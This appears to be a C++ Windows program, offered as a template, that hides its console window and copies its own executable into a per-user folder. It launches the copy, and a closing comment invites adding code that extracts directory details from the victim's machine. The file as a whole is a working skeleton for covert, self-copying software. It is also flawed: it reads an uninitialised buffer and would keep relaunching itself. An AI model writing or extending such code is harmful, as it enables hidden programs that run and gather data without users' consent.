#include <stdio.h> 
#include<ctime>
#include<iostream>
#include<Windows.h>
#include<thread>
#include<sstream>
#include<fstream>
#include<string>
#include<shellapi.h>
#include<Shlwapi.h>
#include<WinBase.h>
#include<cstdlib>
using namespace std;
#pragma warning(disable : 4996)
#pragma warning(disable : 6054)
#undef UNICODE
	int main()
	{

		FreeConsole();//Hide the Console Window






		char acUserName[100];   //Get Username
		string userName(acUserName);
		DWORD nUserName = sizeof(acUserName);
		if (GetUserName(acUserName, &nUserName)) {





			ofstream NameFile;
			NameFile.open("Name.txt");
			NameFile << "C:\\Example\\" << acUserName << "\\ThisApp.exe";  //Set the target Path with the Username
			NameFile.close();
		}

		//Read the target Path as a String
		ifstream cfile("Name.txt");
		string strlocation;
		while (getline(cfile, strlocation)) {
		}



		char newLocation[1024]; //Convert String to Char
		strcpy(newLocation, strlocation.c_str());



		{


			char filename[MAX_PATH];
			//Uncoment the following line to set default target path
			//char newLocation[] = "C:\\Default\\Path\\ThisApp.exe";
			BOOL stats = 0;
			DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
			if (size) {
				CopyFile(filename, newLocation, stats);
			}
			else {
				printf("Could not find EXE file name.\n");
			}


		}

		system(newLocation);//Open the exe-file in the new location

//Now here you can add functions or tasks that the program can do in the new location

// You can paste code from the following repository to extract details from the given location ->  https://github.com/Eggycapibara910/Directory-detail-extractor
		
		return 0;
	}
